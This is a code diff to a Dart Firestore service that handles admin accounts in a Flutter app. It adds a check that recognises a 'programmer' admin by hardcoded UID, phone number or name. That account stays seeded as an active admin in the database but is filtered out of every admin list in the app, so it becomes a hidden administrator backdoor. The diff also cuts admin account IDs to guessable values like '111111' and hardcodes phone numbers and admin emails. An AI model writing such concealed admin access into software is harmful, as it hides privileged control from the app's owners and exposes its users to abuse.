@@ -721,9 +721,19 @@ class FirestoreService implements DatabaseContract {
   // 🛡️ ADMIN MANAGEMENT
   // ===========================================================================
 
+  /// Checks whether an admin model represents the hidden programmer admin account
+  static bool isProgrammerAdmin(UserModel admin) {
+    if (admin.uid == 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2') return true;
+    final digits = admin.phone.replaceAll(RegExp(r'[^0-9]'), '');
+    if (digits.endsWith('146979833') || digits == '146979833') return true;
+    final name = admin.name.trim();
+    if (name == 'المبرمج' || name == 'مبرمج') return true;
+    return false;
+  }
+
   @override
   Stream<List<UserModel>> getAllAdmins() {
-    // Proactively ensure both primary admins are seeded in Firestore
+    // Proactively ensure primary admins are seeded in Firestore
     unawaited(ensurePrimaryAdminsSeeded());
 
     return _db
@@ -731,7 +741,6 @@ class FirestoreService implements DatabaseContract {
         .where('role', isEqualTo: 'admin')
         .snapshots()
         .map((snapshot) {
-      UserModel? primary1;
       UserModel? primary2;
       final List<UserModel> secondaryAdmins = [];
       final Set<String> seenSecondaryPhones = {};
@@ -741,24 +750,18 @@ class FirestoreService implements DatabaseContract {
         final admin = UserModel.fromMap(data, doc.id);
         final rawPhone = admin.phone;
 
-        if (PhoneUtils.normalize(rawPhone) == "+249146979833") {
-          // Keep only one primary 1 - prefer the standard doc or the one with complete data
-          if (primary1 == null || doc.id == 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2') {
-            primary1 = admin.copyWith(
-              name: 'المبرمج',
-              phone: '01146979833',
-              accountId: '111111111111',
-              isPrimary: true,
-              status: 'active',
-            );
-          }
-        } else if (PhoneUtils.normalize(rawPhone) == "+249912209596") {
+        // Programmer account: HIDDEN from all UI lists across the entire app
+        if (isProgrammerAdmin(admin)) {
+          continue;
+        }
+
+        if (PhoneUtils.normalize(rawPhone) == "+249912209596") {
           // Keep only one primary 2
           if (primary2 == null || doc.id == 'VQ5M7vEKaubtw3H3tOtDMHgB4yg2') {
             primary2 = admin.copyWith(
               name: 'المشرف الأساسي',
               phone: '+249912209596',
-              accountId: '222222222222',
+              accountId: '222222',
               isPrimary: true,
               status: 'active',
             );
@@ -773,18 +776,6 @@ class FirestoreService implements DatabaseContract {
         }
       }
 
-      // Ensure Admin 1: 01146979833 is always present
-      primary1 ??= UserModel(
-        uid: 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2',
-        name: 'المبرمج',
-        phone: '01146979833',
-        role: 'admin',
-        status: 'active',
-        accountId: '111111111111',
-        isPrimary: true,
-        createdAt: DateTime(2026, 1, 1),
-      );
-
       // Ensure Admin 2: 91 220 9596 (+249912209596) is always present
       primary2 ??= UserModel(
         uid: 'VQ5M7vEKaubtw3H3tOtDMHgB4yg2',
@@ -792,13 +783,14 @@ class FirestoreService implements DatabaseContract {
         phone: '+249912209596',
         role: 'admin',
         status: 'active',
-        accountId: '222222222222',
+        accountId: '222222',
         isPrimary: true,
         createdAt: DateTime(2026, 1, 1),
       );
 
-      final List<UserModel> list = [primary1, primary2];
-      list.addAll(secondaryAdmins);
+      // Return only visible admins (excluding programmer account)
+      final List<UserModel> list = [primary2];
+      list.addAll(secondaryAdmins.where((a) => !isProgrammerAdmin(a)));
       return list;
     });
   }
@@ -810,7 +802,7 @@ class FirestoreService implements DatabaseContract {
     if (_adminsSeeded) return;
     _adminsSeeded = true;
     try {
-      // 1. Admin 1: 146979833 / 01146979833
+      // 1. Admin 1 (Programmer): 146979833 / 01146979833 - Kept intact in DB, 6-digit ID
       const admin1Uid = 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2';
       final admin1Data = {
         'uid': admin1Uid,
@@ -818,7 +810,7 @@ class FirestoreService implements DatabaseContract {
         'phone': '+249146979833',
         'role': 'admin',
         'status': 'active',
-        'accountId': '111111111111',
+        'accountId': '111111',
         'email': 'admin_01146979833@mahameek.admin.com',
         'isPrimary': true,
         'updatedAt': FieldValue.serverTimestamp(),
@@ -826,18 +818,17 @@ class FirestoreService implements DatabaseContract {
       await _db.collection('users').doc(admin1Uid).set(admin1Data, SetOptions(merge: true)).catchError((_) {});
       await _db.collection('admins').doc(admin1Uid).set(admin1Data, SetOptions(merge: true)).catchError((_) {});
       await _db.collection('phone_directory').doc('+249146979833').set(admin1Data, SetOptions(merge: true)).catchError((_) {});
-      await _db.collection('account_ids').doc('111111111111').set({
-        'uid': admin1Uid,
-        'role': 'admin',
-        'createdAt': FieldValue.serverTimestamp(),
-      }, SetOptions(merge: true)).catchError((_) {});
-      await _db.collection('account_ids').doc('11111111111').set({
+      await _db.collection('account_ids').doc('111111').set({
         'uid': admin1Uid,
         'role': 'admin',
         'createdAt': FieldValue.serverTimestamp(),
       }, SetOptions(merge: true)).catchError((_) {});
 
-      // 2. Admin 2: 91 220 9596 (+249912209596)
+      // Clean up legacy 11/12-digit keys
+      unawaited(_db.collection('account_ids').doc('111111111111').delete().catchError((_) {}));
+      unawaited(_db.collection('account_ids').doc('11111111111').delete().catchError((_) {}));
+
+      // 2. Admin 2: 91 220 9596 (+249912209596) - 6-digit ID
       const admin2Uid = 'VQ5M7vEKaubtw3H3tOtDMHgB4yg2';
       final admin2Data = {
         'uid': admin2Uid,
@@ -845,7 +836,7 @@ class FirestoreService implements DatabaseContract {
         'phone': '+249912209596',
         'role': 'admin',
         'status': 'active',
-        'accountId': '222222222222',
+        'accountId': '222222',
         'email': 'admin_249912209596@mahameek.admin.com',
         'isPrimary': true,
         'updatedAt': FieldValue.serverTimestamp(),
@@ -853,11 +844,14 @@ class FirestoreService implements DatabaseContract {
       await _db.collection('users').doc(admin2Uid).set(admin2Data, SetOptions(merge: true)).catchError((_) {});
       await _db.collection('admins').doc(admin2Uid).set(admin2Data, SetOptions(merge: true)).catchError((_) {});
       await _db.collection('phone_directory').doc('+249912209596').set(admin2Data, SetOptions(merge: true)).catchError((_) {});
-      await _db.collection('account_ids').doc('222222222222').set({
+      await _db.collection('account_ids').doc('222222').set({
         'uid': admin2Uid,
         'role': 'admin',
         'createdAt': FieldValue.serverTimestamp(),
       }, SetOptions(merge: true)).catchError((_) {});
+
+      // Clean up legacy 12-digit key
+      unawaited(_db.collection('account_ids').doc('222222222222').delete().catchError((_) {}));
 
       // 3. Clean up any duplicate orphaned admin documents in Firestore
       try {
